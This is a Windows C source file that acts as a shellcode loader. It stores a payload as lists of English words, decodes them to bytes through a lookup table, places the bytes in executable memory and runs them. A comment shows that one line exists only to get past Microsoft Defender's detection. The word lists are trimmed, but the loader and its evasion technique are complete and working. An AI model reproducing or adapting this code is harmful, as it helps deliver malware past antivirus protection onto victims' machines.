#include <windows.h>
#include <stdio.h>


int main(void)
{
	unsigned char* translation_table[256] = { "gamma","badge","breed","brush","heart",
	---trimmed---
"these","forth","fewer","dried","car" };

	unsigned char* translated_dict[782] = { "token","lycos","along","blade","named",
	--trimmed---
"realm","level","crack","human","car","harry" };

	unsigned char shellcode[782] = { 0 };
	int sc_len = sizeof(shellcode);

	for (int sc_index = 0; sc_index < sc_len; sc_index++) {
	printf(""); // Defender is detecting the translation routine
		for (int tt_index = 0; tt_index <= 255; tt_index++) {
			if (strcmp(translation_table[tt_index], translated_dict[sc_index]) == 0) {
				shellcode[sc_index] = tt_index;
				break;
			}
		}
	}

	// Allocate memory for the shellcode and execute
	void* exec_memory = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (exec_memory == NULL)
	{
		printf("Memory allocation failed.\n");
		return 1;
	}

	RtlCopyMemory(exec_memory, shellcode, sc_len);
	void(*func)() = (void(*)())exec_memory;
	func();

	VirtualFree(exec_memory, 0, MEM_RELEASE);

	return 0;

}
